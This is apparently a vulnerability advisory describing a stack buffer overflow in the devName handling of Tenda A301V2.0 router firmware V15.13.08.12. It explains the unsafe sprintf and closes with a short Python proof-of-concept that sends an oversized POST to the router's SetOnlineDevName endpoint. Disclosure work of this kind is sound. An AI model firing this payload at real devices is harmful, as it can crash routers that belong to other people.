## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-3328.html

## Affected version

A301V2.0 Firmware  V15.13.08.12

## Vulnerability details

In the Tenda A301V2.0 Firmware  V15.13.08.12 has a stack overflow vulnerability located in the `formSetDeviceName` function. This function accepts the `devName` parameter from a POST request and passes it to the `set_device_name` function. Within `set_device_name`, the array `mib_vlaue` is fixed at 256 bytes. However, since the user has control over the input of `devName`, the statement `sprintf(mib_vlaue, "%s;1", dev_name);` leads to a buffer overflow. The user-supplied `devName` can exceed the capacity of the `mib_vlaue` array, thus triggering this security vulnerability.

![image-20240318160539150](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318160539150.png)

![image-20240318160601400](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318160601400.png)

![image-20240318160553514](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318160553514.png)

## PoC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetOnlineDevName"
payload = b"a"*2000

data = {"mac": 1,"devName": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240612212644020](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240612212644020.png)
